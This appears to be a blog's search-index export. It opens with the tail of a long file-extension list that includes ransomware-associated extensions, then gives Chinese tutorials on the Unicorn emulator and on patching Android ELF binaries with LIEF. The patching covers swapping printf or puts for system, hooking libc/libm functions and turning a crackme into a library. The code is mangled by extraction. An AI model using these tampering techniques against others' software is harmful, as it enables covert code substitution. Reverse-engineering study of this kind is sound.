.bak~ .bamboopaper .bank .bar .bau .bax .bay .bbcd .bbl .bbprojectd .bbs .bbxt .bc5 .bc6 .bc7 .bcd .bck .bcp .bdb .bdb2 .bdp .bdr .bdt2 .bdt3 .bean .bfa .bgt .bgv .bi8 .bib .bibtex .bic .big .bik .bil .bin .bina .bizdocument .bjl .bk .bk! .bk1 .bk2 .bk3 .bk4 .bk5 .bk6 .bk7 .bk8 .bk9 .bkf .bkg .bkp .bks .bkup .bld .blend .blend2 .blg .blk .blm .blob .blp .bmc .bmf .bmk .bml .bmm .bmml .bmp .bmpr .bna .boc .book .bop .bp1 .bp2 .bp3 .bpf .bpk .bpl .bpm .bpmc .bps .bpw .brd .breaking_bad .brh .brl .brs .brx .bsa .bsk .bso .bsp .bst .btd .btf .btoa .btx .burn .burntheme .bvd .bwd .bwf .bwp .bxx .bzabw .c .c2e .c6 .cadoc .cae .cag .calca .cam .camproj .cap .capt .car .caro .cas .cat .catproduct .cawr .cbf .cbor .cbr .cbz .cc .ccc .ccd .ccf .cch .ccitt .cd .cd1 .cd2 .cdc .cdd .cddz .cdf .cdi .cdk .cdl .cdm .cdml .cdmm .cdmz .cdpz .cdr .cdr3 .cdr4 .cdr5 .cdr6 .cdrw .cds .cdt .cdtx .cdx .cdxml .ce1 .ce2 .cef .cer .cert .cf5 .cfd .cfg .cfp .cfr .cgf .cgfiletypetest .cgi .cgm .cgp .chi .chk .chm .chml .chmprj .chp .chpscrap .cht .chtml .cib .cida .cif .cipo .civ4worldbuildersave .civbeyondswordsave .cl2arc .cl2doc .clam .clarify .class .clb .clkd .clkt .clp .clr .cls .clx .cmf .cml .cmp .cms .cmt .cmu .cnf .cng .cnt .cnv .cod .col .comicdoc .comiclife .compositionmodel .compositiontemplate .con .conf .config .contact .converterx .cp .cpc .cpd .cpdt .cphd .cpi .cpio .cpp .cpy .cr2 .crashed .craw .crb .crd .creole .cri .crjoker .crs .crs3 .crt .crtr .crw .crwl .crypt .crypted .cryptowall .cryptra .cs .cs8 .csa .cse .csh .csi .csl .cso .csp .csr .css .cst .csv .ctbl .ctd .cte .ctf .ctl .ctt .ctxt .cty .cue .current .cvj .cvl .cvw .cw3 .cwf .cwk .cwn .cwr .cws .cwwp .cyi .cys .d .d3dbsp .dac .dadx .dag .dal .dap .das .dash .dat .database .datx .dayzprofile .dazip .db .db_journal .db0 .db3 .dba .dbb .dbc .dbf .dbfv .db-journal .dbk .dbr .dbs .dbx .dc2 .dc4 .dca .dcd .dcf .dch .dco .dcp .dcr .dcs .dct5 .dcu .ddc .ddcx .ddd .ddif .ddoc .ddrw .dds .deb .debian .dec .ded .default .del .dem .der .des .desc .description .design .desklink .det .deu .dev .dex .dfe .dfl .dfm .dft .dfti .dgc .dgm .dgpd .dgr .dgrh .dgs .dhe .dic .did .dif .dii .dim .dime .dip .dir .directory .disc .disco .disk .dit .divx .diz .djbz .djv .djvu .dk@p .dlc .dlg .dmbk .dmg .dmp .dmtemplate .dmv .dna .dng .dnl .dob .doc .doc# .docb .doce .docenx .dochtml .docl .docm .docmhtml .docs .docset .docstates .doct .documentrevisions-v100 .docx .docxl .docxml .dok .dot .dothtml .dotm .dotmenx .dotx .dotxenx .dox .doxy .doz .dp .dpd .dpi .dpk .dpl .dpr .drd .dream .drf .drm .drmx .drmz .drw .dsc .dsd .dsdic .dsf .dsg .dsk .dsl .dsn .dsp .dsy .dtd .dtm .dtml .dtp .dtx .dump .dvb .dvd .dvi .dvs .dvx .dvz .dwd .dwdoc .dwf .dwfx .dwg .dwlibrary .dwp .dwt .dxb .dxd .dxe .dxf .dxg .dxn .dxr .dxstudio .dzp .e3s .e4a .easmx .ebk .ebs .ec4 .ecc .ecr .edb .edd .edf .edl .edml .edn .edoc .edrwx .edt .edz .efa .efax .eff .efl .efm .efr .eftx .efu .efx .egr .egt .ehp .eif .eip .ekm .el6 .eld .elf .elfo .eln .emc .emf .eml .emlxpart .emm .enc .enciphered .encrypted .enfpack .ent .enx .enyd .eob .eot .ep .epdf .epf .epk .eprtx .eps .epsf .ept .epub .eql .erbsql .erd .ere .erf .err .es .es3 .esc .esd .esf .esm .esp .ess .esv .et .ete .etng .etnt .ets .etx .euc .evo .evy .ewl .ex .exc .exd .exf .exif .exprwdhtml .exprwdxml .exx .ez .ezc .ezm .ezs .ezz .f4v .f90 .f96 .fac .fadein .fae .faq .fax .fbd .fbp6 .fbs .fcd .fcf .fcstd .fd .fdb .fdf .fdoc .fdr .fds .fdseq .fdw .fdx .fed .feed-ms .feedsdb-ms .ff .ffa .ffd .ffdata .fff .ffl .ffo .fft .ffx .fh .fhd .fig .fin .fl .fla .flac .flag .flat .flf .flib .flka .flkb .flm .flp .fls .flt .fltr .flv .flvv .fly .fm .fm3 .fmc .fmd .fmf .fml .fmp .fmp3 .fnf .fo .fodg .fodp .fods .fodt .folio .for .forge .fos .fountain .fp .fpage .fpdoclib .fpenc .fphomeop .fpk .fplinkbar .fpp .fpt .fpx .fra .frag .frdat .frdoc .freepp .frelf .frm .fs .fsc .fsd .fsf .fsh .fsp .fss .ft10 .ft11 .ft7 .ft8 .ft9 .ftil .ftr .fwk .fwtemplate .fxd .fxg .fxo .fxr .fzh .fzip .ga3 .gam .gan .gcsx .gct .gdb .gdc .gdoc .ged .gev .gevl .gfe .gform .gfx .ggb .ghe .gho .gif .gil .giw .glink .glk .glo .glos .gly .gml .gmp .gnd .gno .gofin .gp4 .gpd .gpf .gpg .gpn .gpx .gpz .gra .grade .gray .grey .grf .grk .grle .groups .gry .gs .gsa .gsf .gsheet .gslides .gsm .gthr .gui .gul .gvi .gxk .gxl .gz .gzig .gzip .h .h1q .h1s .h1w .h2o .h3m .h4r .haml .hbk .hbl .hbx .hcl .hcw .hda .hdd .hdl .hdt .hdx .hed .help .helpindex .hex .hfd .hft .hhs .hkdb .hkx .hlf .hlp .hlx .hlx2 .hlz .hm2 .hmskin .hnd .hoi4 .hot .hp2 .hpd .hpj .hplg .hpo .hpp .hps .hpt .hpw .hqx .hrx .hs .hsm .hsx .hta .htm .htm~ .html .htmls .htmlz .htms .htpasswd .htz5 .hvpl .hw3 .hwp .hwpml .hwt .hxe .hxi .hxq .hxr .hxs .hyp .hype .iab .iaf .ial .ibank .ibcd .ibd .ibk .ibz .icalevent .icaltodo .icc .icml .icmt .ico .ics .icst .icxs .idap .idc .idd .idl .idml .idp .idx .ie5 .ie6 .ie7 .ie8 .ie9 .iff .ifp .ign .igr .ihf .ihp .iif .iiq .iks .ila .ildoc .img .imp .imr .incp .incpas .ind .indb .indd .indl .indp .indt .inf .info .ink .inld .inlk .inp .inprogress .inrs .inss .installhelper .insx .internetconnect .inx .ioca .iof .ipa .ipf .ipr .ish1 .ish2 .ish3 .iso .ispx .isu .isz .itdb .ite .itl .itm .itmz .itp .its .ivt .iw44 .iwa .iwd .iwi .iwprj .iwtpl .ix .ixv .jac .jar .jav .java .jb2 .jbc .jbig .jbig2 .jc .jdd .jfif .jge .jgz .jhd .jiaf .jias .jif .jiff .jnt .joe .jp1 .jpc .jpe .jpeg .jpf .jpg .jpgx .jpm .jpw .jrf .jrl .jrprint .js .jsd .json .jsp .jspa .jspx .jtd .jtdc .jtt .jtx .just .jw .jwl .jww .k25 .kbd .kbf .kc2 .kdb .kdbx .kdc .kde .kdf .kes .key .keynote .key-tef .kf .kfm .kfp .kid .klq .klw .kmz .knt .kos .kpdx .kpr .ksd .ksp .kss .ksw .kuip .kwd .kwm .kwp .laccdb .lastlogin .lat .latex .lax .lay .lay6 .layout .lbf .lbi .lbl .lcd .lcf .lcn .ldb .ldf .lfe .lgp .lhd .lib .lit .litemod .ll3 .llv .lmd .lngttarch2 .lnk .localstorage .log .logonxp .lok .lot .lp .lp2 .lp7 .lpa .lpc .lpd .lpdf .lpx .lrf .ls5 .lst .ltcx .ltm .ltr .ltx .lua .lvd .lvivt .lvl .lvw .lwd .lwo .lwp .lyx .m .m13 .m14 .m2 .m2ts .m3u .m3u8 .m4a .m4p .m4u .m4v .m7p .maca .mag .maker .maml .man .manu .map .mapimail .marc .markdn .mars .mass .max .maxfr .maxm .mbbk .mbox .mbx .mc9 .mcd .mcdx .mcf .mcgame .mcmac .mcmeta .mcrp .mcw .md .md0 .md1 .md2 .md3 .md5 .mdb .mdbackup .mdbhtml .mdc .mdccache .mddata .mdf .mdg .mdi .mdk .mdl .mdn .mds .mecontact .med .mef .meh .mell .mellel .menu .meo .met .metadata_neverindex .mf .mfa .mfp .mfw .mga .mgmt .mgourmet .mgourmet3 .mhp .mht .mhtenx .mhtmlenx .mi .mic .mid .mif .mim .mime .mindnode .mip .mission .mix .mjd .mjdoc .mke .mkv .mla .mlb .mlj .mlm .mls .mlsxml .mlx .mm .mm6 .mm7 .mm8 .mmap .mmc .mmd .mme .mmjs .mml .mmo .mmsw .mmw .mny .mo .mobi .mod .moneywell .mos .mov .movie .moz .mp1 .mp2 .mp3 .mp4 .mp4v .mpa .mpe .mpeg .mpf .mpg .mph .mpj .mpq .mpqge .mpr .mpt .mpv .mpv2 .mrd .mru .mrw .mrwref .ms .msd .mse .msg .mshc .msi .msie .msl .mso .msor .msp .msq .ms-tnef .msw .mswd .mtdd .mtml .mto .mtp .mts .mtx .mug .mui .mvd .mvdx .mvex .mwd .mwii .mwpd .mwpp .mws .mxd .mxg .mxp .myd .mydocs .myi .mz .n3 .narrative .nav .navmap .nb .nbak .nbf .nbp .ncd .ncf .nd .ndd .ndf .ndl .ndr .nds .ne1 .ne3 .nef .nfo .nfs11save .ng .njx .nk2 .nmbtemplate .nmu .nokogiri .nop .note .now .npd .npdf .npp .npt .nrbak .nrg .nri .nrl .nrmlib .nrw .ns2 .ns3 .ns4 .nsd .nsf .nsg .nsh .nst .ntf .ntl .ntp .nts .number .numbers .nvd .nvdl .nvram .nwb .nwbak .nwcab .nwcp .nx^d .nx__ .nx1 .nx2 .nxl .nyf .oa2 .oa3 .oab .oad .oas .obd .obj .obr .obt .obx .obz .ocdc .ocs .oda .odb .odc .odccubefile .odf .odg .odh .odi .odif .odm .odo .odp .ods .odt .odt# .odttf .odz .officeui .ofn .oft .oga .ogc .ogg .oil .ojz .okm .ole .ole2 .olf .olv .oly .omlog .omp .onb .one .oos .oot .opd .opf .opj .oplx .opn .opt .opx .opxs .orf .ort .osd .osdx .ost .otc .otf .otg .oth .oti .otn .otp .ots .ott .otw .out .ovd .owl .oxps .oxt .p10 .p12 .p2s .p3x .p65 .p7b .p7c .p7z .pab .pack .pad .pages .pages-tef .pak .paq .pas .pat .paux .pbd .pbf .pbk .pbp .pbr .pbs .pbx5script .pbxscript .pcd .pcf .pcj .pct .pcv .pcw .pd .pdb .pdc .pdcr .pdd .pdf .pdf .pdf_profile .pdf_tsid .pdfa .pdfe .pdfenx .pdfl .pdfua .pdfvt .pdfx .pdfxml .pdfz .pdg .pdp .pdz .peb .pef .pem .pez .pf .pfc .pfd .pfl .pfm .pfsx .pft .pfx .pg .pgs .php .phr .phs .pih .pixexp .pj2 .pj4 .pj5 .pk .pkb .pkey .pkg .pkh .pkpass .pl .plan .plb .plc .pld .pli .pln .plus_muhd .pm .pm3 .pm4 .pm5 .pm6 .pm7 .pmd .pmt .pmv .pmx .png .pnu .po .pod .pool .pot .pothtml .potm .potx .pp3 .ppam .ppd .ppdf .ppf .ppj .ppp .pps .ppsenx .ppsm .ppsx .ppt .ppte .ppthtml .pptl .pptm .pptmhtml .pptt .pptx .ppws .ppx .prc .prd .pref .prel .prf .prj .prn .pro .pro4 .pro4dvd .pro5 .pro5dvd .pro5plx .pro5x .proofingtool .props .proqc .prproj .prr .prs .prt .prtc .prv .ps .ps2 .ps3 .psa .psafe3 .psb .psd .pse8db .psf .psg .psi2 .psip .psk .psm .psmd .pspimage .pst .psw .psw6 .pswx .psz .pt3 .pt6 .ptc .ptf .pth .ptk .ptn .ptn2 .pts .ptx .pub .pubf .pubhtml .pubmhtml .pubx .puz .pvd .pve .pvf .pw .pwd .pwe .pwf .pwi .pwm .pwp .pwre .pxd .pxl .pxp .py .pys .pzc .pzf .pzt .qba .qbb .qbl .qbm .qbr .qbw .qbx .qby .qch .qcow .qcow2 .qct .qdf .qed .qel .qfl .qfxx .qhp .qht .qhtm .qic .qif .qlgenerator .qpx .qrt .qt .qtq .qtr .qtw .quox .qvw .qwd .qwt .qxb .qxd .qxl .qxp .qxt .r00 .r01 .r02 .r03 .r0f .r0z .r3d .ra .ra2 .raf .ram .ramd .rap .rar .rat .raw .razy .rb .rbc .rcb .rd .rd1 .rdb .rdf .rdfs .rdi .rdo .rdoc .rdocoptions .rdz .re4 .rec .rels .res .resbuild .rest .result .rev .rf .rf1 .rft .rgn .rgo .rgss3a .rha .rhif .rim .rit .rlf .rll .rm .rm5 .rmd .rmf .rmh .rna .rng .rnt .rnw .ro3 .rofl .roi .ros .rov .row .rox .rpf .rpt .rptr .rrd .rrpa .rrt .rrx .rs .rsdf .rsdoc .rsm .rsp .rsrc .rst .rsw .rt .rt .rtdf .rte .rtf .rtf_ .rtfd .rtk .rtpi .rts .rtsl .rtsx .rtx .rum .run .rv .rvf .rvt .rw2 .rwl .rwlibrary .rwz .rxdoc .rzk .rzx .s3db .s8bn .sa5 .sa7 .sa8 .saas .sad .saf .safe .safetext .sam .sas7bdat .sav .save .say .sb .sbn .sbo .sbpf .sbsc .sbst .sc2save .scd .scdoc .sce .sch .scm .scmt .scn .scr .scriv .scrivx .scs .scspack .scssc .sct .scw .scx .sd .sd0 .sd1 .sda .sdb .sdc .sdd .sddraft .sdf .sdi .sdl .sdmdocument .sdn .sdo .sdoc .sdp .sdr .sds .sdt .sdv .sdw .search-ms .secure .sef .sel .sen .seq .sequ .server .ses .set .setup .sev .sff .sfs .sfx .sgf .sgi .sgl .sgm .sgml .sgz .sh .sh6 .shar .shb .show .shr .shs .shtml .shw .shy .sic .sid .sidd .sidn .sie .sik .sis .sky .sla .sldm .sldx .slf .slk .slm .slt .slz .sm .smd .sme .smf .smh .smlx .smn .smp .sms .smwt .smx .smz .snb .snf .sng .snk .snp .snt .snx .so .soi .spb .spd .spdf .spk .spl .spm .spml .sppt .spr .sprt .sprz .sql .sqlite .sqlite3 .sqlitedb .sqllite .sqx .sr2 .src .srf .srfl .srs .srt .srw .ssa .ssh .ssi .ssiw .ssm .ssx .st4 .st5 .st6 .st7 .st8 .stc .std .sti .stm .stp .stpz .struct .stt .stw .stx .stxt .sty .sud .suf .sum .surf .svd .svdl .svg .svi .svm .svn .svp .svr .svs .swd .swdoc .sweb .swf .switch .swp .sxc .sxd .sxe .sxg .sxi .sxl .sxm .sxml .sxw .syn .syncdb .t .t01 .t03 .t05 .t10 .t12 .t13 .t14 .t2 .t2k .t2t .t4g .t80 .ta1 .ta2 .ta9 .tabula-doc .tabula-docstyle .tah .tar .tax .tax2009 .tax2013 .tax2014 .tb .tbb .tbd .tbk .tbkx .tbz2 .tcd .tch .tck .tcx .tdg .tdl .tdoc .tdr .te1 .template .tex .texi .texinfo .text .textclipping .textile .tfd .tfm .tfr .tfrd .tg .tga .tgz .thm .thml .thmx .thr .tib .tif .tiff .tjp .tk3 .tlb .tld .tlg .tlt .tlx .tlz .tm .tm3 .tmb .tmd .tml .tmlanguage .tmv .tmz .tns .tnsp .toast .toc .topx .tor .torrent .totalslayout .tp .tpl .tpo .tpsdb .tpu .tpx .trashinfo .trif .trp .ts .tsc .tt11 .tt2 .ttax .ttxt .tu .tur .tvd .twdi .twdx .tww .tx .txd .txe .txf .txm .txn .txt .txtrpt .u3d .uax .ubz .ucd .udb .udf .udl .uea .uhtml .ukr .ulf .uli .ulys .ump .umx .unity3d .unr .unx .uof .uop .uos .uot .updf .upk .upoi .upp .urd-journal .urf .url .urp .usa .usx .ut2 .ut3 .utc .utd .ute .utf8 .uti .utm .uts .utx .uu .uud .uue .uvx .uxx .v .v2t .val .vault .vbadoc .vbd .vbk .vbox .vbs .vc .vcal .vcd .vce .vcf .vdf .vdi .vdo .vdoc .vdt .ver .vf .vfs0 .vhd .vhdx .view .viz .vlc .vlt .vmbx .vmdk .vmf .vmg .vmm .vmsd .vmt .vmx .vmxf .vob .voprefs .vor .vp .vpk .vpl .vpp_pc .vs .vsd .vsdx .vsf .vsi .vspolicy .vst .vstx .vtf .vthought .vtv .vtx .vw .vw3 .w .w2p .w3g .w3x .w51 .w52 .w60 .w61 .w6bn .w6w .w8bn .w8tn .wab .wad .waff .wallet .war .wav .wave .waw .wb .wb2 .wb3 .wbk .wbt .wbxml .wbz .wcf .wcl .wcn .wcp .wcst .wd0 .wd1 .wd2 .wdbn .wdgt .wdl .wdn .wdoc .wdx9 .web .webdoc .webpart .wep .wflx .wht .wiz .wk! .wk1 .wk3 .wk4 .wkb .wki .wkl .wks .wlb .wld .wll .wls .wlxml .wm .wma .wmd .wmdb .wmf .wmga .wmk .wml .wmlc .wmmp .wmo .wms .wmv .wmx .wn .wolf .word .wordlist .wotreplay .wow .wp .wp42 .wp5 .wp50 .wp6 .wp7 .wpa .wpc2 .wpd .wpd0 .wpd1 .wpd2 .wpd3 .wpe .wpf .wpk .wpl .wpost .wps .wpt .wpw .wr1 .wrf .wri .wrlk .ws .ws1 .ws2 .ws3 .ws4 .ws5 .ws6 .ws7 .wsd .wsf .wsh .wsp .wtbn .wtd .wtf .wtmp .wtp .wts .wtt .wtx .wvw .wvx .wwcx .wwi .wwl .wws .wwt .wxmx .wxp .wyn .wzn .wzs .x11 .x16 .x3f .x3g .xamlx .xar .xav .xbd .xbrl .xci .xda .xdc .xdf .xdo .xdoc .xdw .xf .xfd .xfdf .xfi .xfl .xfn .xfo .xfp .xfx .xgml .xht .xhtm .xhtml .xif .xig .xis .xjf .xl .xla .xlam .xlb .xlc .xle .xlf .xline .xlist .xlk .xll .xlm .xlnk .xlr .xls .xlsb .xlse .xlshtml .xlsl .xlsm .xlst .xlsx .xlsxl .xlt .xlthtml .xltm .xltx .xlv .xlw .xlwx .xma .xmdf .xml .xmmap .xmn .xmp .xms .xmt_bin .xmta .xpd .xpi .xpm .xps .xpse .xpt .xpwe .xqm .xqr .xqx .xrdml .xsc .xsd .xsig .xsl .xslt .xtbl .xtd .xtg .xtml .xtps .xtrl .xv0 .xv2 .xv3 .xvg .xvid .xvl .xwd .xweb3htm .xweb3html .xweb4stm .xweb4xml .xwf .xwp .xxe .xxx .xy .xy3 .xy4v .xyd .yab .ycbcra .yenc .yml .ync .yps .yuv .z02 .z04 .zap .zip .zipx .zoo .zps .ztmp]]></content>
  </entry>
  <entry>
    <title><![CDATA[Unicorn使用]]></title>
    <url>%2F2018%2F03%2F15%2FUnicorn%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Unicore简介 Unocorn引擎是什么? 简单的来讲，一款模拟器。尽管不太常见，你不能用来模拟整个程序或者系统，同时它也不支持syscall。你只能通过手动的方式来映射内存以及数据写入，然后就可以从某个指定的地址开始执行模拟了。 用途 执行一些恶意软件中你感兴趣的函数而不必创建整个进程CTF比赛中也很常用Fuzzing[https://hackernoon.com/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf]GDB插件扩充，例如支持长跳转模拟混淆后的代码 框架代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from unicorn import *from unicorn.arm_const import * import struct def read(name): with open(name) as f: return f.read() def u32(data): return struct.unpack(&quot;I&quot;, data)[0] def p32(num): return struct.pack(&quot;I&quot;, num) mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN) BASE = 0x10000STACK_ADDR = 0x300000STACK_SIZE = 1024*1024 mu.mem_map(BASE, 1024*1024)mu.mem_map(STACK_ADDR, STACK_SIZE) mu.mem_write(BASE, read(&quot;./task4&quot;))mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2) instructions_skip_list = [] CCC_ENTRY = 0x000104D0CCC_END = 0x00010580 stack = [] # Stack for storing the argumentsd = &#123;&#125; # Dictionary that holds return values for given function arguments def hook_code(mu, address, size, user_data): #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size)) mu.hook_add(UC_HOOK_CODE, hook_code) mu.emu_start(0x00010584, 0x000105A8) return_value = mu.reg_read(UC_ARM_REG_R1) # We end the emulation at printf(&quot;%d\n&quot;, ccc(x)).print &quot;The return value is %d&quot; % return_value from unicorn import —— 加载主Unicorn库，它包含函数和基本Constant。from unicorn.x86_const import —— 加载特定于x86和x86-64架构的Constant。Unicorn模块中的所有Const如下： UC_API_MAJOR UC_ERR_VERSION UC_MEM_READ UC_PROT_ALLUC_API_MINOR UC_ERR_WRITE_PROT UC_MEM_READ_AFTER UC_PROT_EXECUC_ARCH_ARM UC_ERR_WRITE_UNALIGNED UC_MEM_READ_PROT UC_PROT_NONEUC_ARCH_ARM64 UC_ERR_WRITE_UNMAPPED UC_MEM_READ_UNMAPPED UC_PROT_READUC_ARCH_M68K UC_HOOK_BLOCK UC_MEM_WRITE UC_PROT_WRITEUC_ARCH_MAX UC_HOOK_CODE UC_MEM_WRITE_PROT UC_QUERY_MODEUC_ARCH_MIPS UC_HOOK_INSN UC_MEM_WRITE_UNMAPPED UC_QUERY_PAGE_SIZEUC_ARCH_PPC UC_HOOK_INTR UC_MILISECOND_SCALE UC_SECOND_SCALEUC_ARCH_SPARC UC_HOOK_MEM_FETCH UC_MODE_16 UC_VERSION_EXTRAUC_ARCH_X86 UC_HOOK_MEM_FETCH_INVALID UC_MODE_32 UC_VERSION_MAJORUC_ERR_ARCH UC_HOOK_MEM_FETCH_PROT UC_MODE_64 UC_VERSION_MINORUC_ERR_ARG UC_HOOK_MEM_FETCH_UNMAPPED UC_MODE_ARM UcUC_ERR_EXCEPTION UC_HOOK_MEM_INVALID UC_MODE_BIG_ENDIAN UcErrorUC_ERR_FETCH_PROT UC_HOOK_MEM_PROT UC_MODE_LITTLE_ENDIAN arm64_constUC_ERR_FETCH_UNALIGNED UC_HOOK_MEM_READ UC_MODE_MCLASS arm_constUC_ERR_FETCH_UNMAPPED UC_HOOK_MEM_READ_AFTER UC_MODE_MICRO debugUC_ERR_HANDLE UC_HOOK_MEM_READ_INVALID UC_MODE_MIPS3 m68k_constUC_ERR_HOOK UC_HOOK_MEM_READ_PROT UC_MODE_MIPS32 mips_constUC_ERR_HOOK_EXIST UC_HOOK_MEM_READ_UNMAPPED UC_MODE_MIPS32R6 sparc_constUC_ERR_INSN_INVALID UC_HOOK_MEM_UNMAPPED UC_MODE_MIPS64 uc_arch_supportedUC_ERR_MAP UC_HOOK_MEM_VALID UC_MODE_PPC32 uc_versionUC_ERR_MODE UC_HOOK_MEM_WRITE UC_MODE_PPC64 unicornUC_ERR_NOMEM UC_HOOK_MEM_WRITE_INVALID UC_MODE_QPX unicorn_constUC_ERR_OK UC_HOOK_MEM_WRITE_PROT UC_MODE_SPARC32 version_bindUC_ERR_READ_PROT UC_HOOK_MEM_WRITE_UNMAPPED UC_MODE_SPARC64 x86_constUC_ERR_READ_UNALIGNED UC_MEM_FETCH UC_MODE_THUMBUC_ERR_READ_UNMAPPED UC_MEM_FETCH_PROT UC_MODE_V8UC_ERR_RESOURCE UC_MEM_FETCH_UNMAPPED UC_MODE_V9 一些示例： mu = Uc(arch, mode) —— 获得一个Uc类的实例，在这里可以指定架构。举例来说： mu = Uc(UC_ARCH_X86, UC_MODE_64) 获得一个x86-64架构的Uc实例。 mu = Uc(UC_ARCH_X86, UC_MODE_32) 获得一个x86-32架构的Uc实例。 mu.mem_map(ADDRESS, 4096) 映射一个内存区域。 mu.mem_write(ADDRESS, DATA) 将数据写入内存。 tmp = mu.mem_read(ADDRESS, SIZE) 从内存中读取数据。 mu.reg_write(UC_X86_REG_ECX, 0x0) 将寄存器重新赋值。 r_esp = mu.reg_read(UC_X86_REG_ESP) 读取寄存器的值。 mu.emu_start(ADDRESS_START, ADDRESS_END) 开始模拟。 指令跟踪：这段代码添加了一个钩子。我们定义了函数hook_code，在模拟每个指令之前调用，该函数需要以下参数：1、Uc实例2、指令的地址3、指令的大小4、用户数据（我们可以在hook_add()的可选参数中传递这个值） 1234def hook_code(mu, address, size, user_data): print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size)) mu.hook_add(UC_HOOK_CODE, hook_code) 参考资料： https://github.com/unicorn-engine/unicorn/tree/master/bindings/python]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用lief对ELF文件Patch]]></title>
    <url>%2F2018%2F03%2F13%2F%E4%BD%BF%E7%94%A8lief%E5%AF%B9ELF%E6%96%87%E4%BB%B6Patch%2F</url>
    <content type="text"><![CDATA[LIEFLIEF可以很方便的对elf， pe，MachO 文件进行parse和patch，由于其提供了python库，故可以实现跨平台。 这里以Android平台为例进行测试。 直接修改目标elf的导入符号注：直接修改符号一般适用于修改前后参数类型、个数完全相同的情况 二进制文件代码如下:123456789101112131415#include &lt;stdio.h&gt;int main()&#123; printf(&quot;id&quot;);&#125;/*Android.mkLOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := lief_testLOCAL_SRC_FILES := main.cLOCAL_CFLAGS += -pie -fPIELOCAL_LDFLAGS += -pie -fPIEinclude $(BUILD_EXECUTABLE)*/ 编译完成后，push到手机中，运行如下图： 使用lief，直接将导入表中的printf符号替换为system12345import liefbinary = lief.parse("lief_test")puts_sym = filter(lambda e: e.name == "printf", binary.dynamic_symbols)[0]puts_sym.name = "system"binary.write("lief_test_patch"); 将lief_test_patch push到手机中，执行结果如下图： 修改 libc 中的相关符号，然后使用 LD_LIBRARY_PATH 加载修改后的库这里需要搞清楚elf加载的lib位置，例如我在一个64bit手机上做实验，那么加载的lib位于/system/lib64/libc.so, 32bit的libc.so位于/system/lib/libc.so使用LD_LIBRARY_PATH=xxx 指定动态链接库的路径 先上实例代码：1234567#include &lt;stdio.h&gt;int main()&#123; puts("id"); printf("finished\n"); return 0;&#125; 这里要实现libc中的puts和system互换,使用lief123456789import lieflibc = lief.parse("libc.so")system_sym = filter(lambda e: e.name == "system", libc.dynamic_symbols)[0]puts_sym = filter(lambda e: e.name == "puts", libc.dynamic_symbols)[0]//注意不能出现两个一样的symbolputs_sym.name = "system"system_sym.name = "puts"libc.write("libc_patch"); 将patch后的libc_patch重命名为libc.so，并与要执行的elf文件放在同一目录内，更改其链接库的path并执行1234adb push libc_patch /data/local/tmpcd /data/local/tmpmv libc_patch libc.soLD_LIBRARY_PATH=. ./lief_test 执行结果如下图所示： 直接添加代码经测试printf，system等函数好像不行，会报segment fault错误，待研究 示例代码如下：1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt; int main(int argc, char **argv) &#123; if (argc != 2) &#123; printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]); exit(-1); &#125; int a = atoi(argv[1]); printf(&quot;exp(%d) = %f\n&quot;, a, exp(a)); return 0;&#125; 目标是hook exp 函数，直接增加一个 segments , 然后劫持函数指针到这里。首先编译一个 lib 用来提供用于 hook 的代码。12345678910111213//test.cdouble hook(double x) &#123; return x + 100;&#125;/*LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := hookLOCAL_SRC_FILES := test.c#LOCAL_CFLAGS += -pic -fPIC#LOCAL_LDFLAGS += -pic -fPICinclude $(BUILD_SHARED_LIBRARY)*/ exp函数在libm库中，因此将手机中的/system/lib/libm.so导出来123456789101112131415import lief libm = lief.parse(&quot;libm.so&quot;)hook = lief.parse(&quot;libhook.so&quot;) segment_added = libm.add(hook.segments[0]) print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address)) exp_symbol = libm.get_symbol(&quot;exp&quot;)hook_symbol = hook.get_symbol(&quot;hook&quot;) exp_symbol.value = segment_added.virtual_address + hook_symbol.value libm.write(&quot;libm.so.6&quot;) 运行结果如下图所示： 通过 got/plt 表 直接劫持程序未测试成功https://lief-project.github.io/doc/latest/tutorials/05_elf_infect_plt_got.html 修改一个可执行文件为链接库对于一个PIE的elf，如果想直接调用其中的某个函数，可以通过lief将其修改为library，通过dlopen/dlsym来调用。 12345678910111213141516171819202122232425262728293031#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;//__attribute__ ((visibility (&quot;hidden&quot;))) 避免编译器自动导出//__attribute__ ((noinline)) 取消内嵌优化#define LOCAL __attribute__ ((visibility (&quot;hidden&quot;)))#define NOINLINE __attribute__ ((noinline))NOINLINE LOCAL int check(char* input) &#123; if (strcmp(input, &quot;easy&quot;) == 0) &#123; return 1; &#125; return 0;&#125;int main(int argc, char** argv) &#123; if (argc != 2) &#123; printf(&quot;Usage: %s flag\n&quot;, argv[0]); exit(-1); &#125; if (check(argv[1])) &#123; printf(&quot;Well done!\n&quot;); &#125; else &#123; printf(&quot;Wrong!\n&quot;); &#125; return 0;&#125;//gcc crackme101.c -O0 -fPIE -pie -Wl,-strip-all -o crackme101.bin 用IDA打开crackme101.bin，找到check函数的偏移地址，将其修改为导出函数:1234import liefcrackme101 = lief.parse(&quot;./crackme101.bin&quot;)crackme101.add_exported_function(0x72A, &quot;check_found&quot;)crackme101.write(&quot;libcrackme101.so&quot;) 此时的libcrackme101.so既是一个library,又是一个可执行文件 实现对其调用：1234567891011121314151617#include &lt;dlfcn.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef int(*check_t)(char*);int main (int argc, char** argv) &#123; void* handler = dlopen(&quot;./libcrackme101.so&quot;, RTLD_LAZY); check_t check_found = (check_t)dlsym(handler, &quot;check_found&quot;); int output = check_found(argv[1]); printf(&quot;Output of check_found(&apos;%s&apos;): %d\n&quot;, argv[1], output); return 0;&#125; 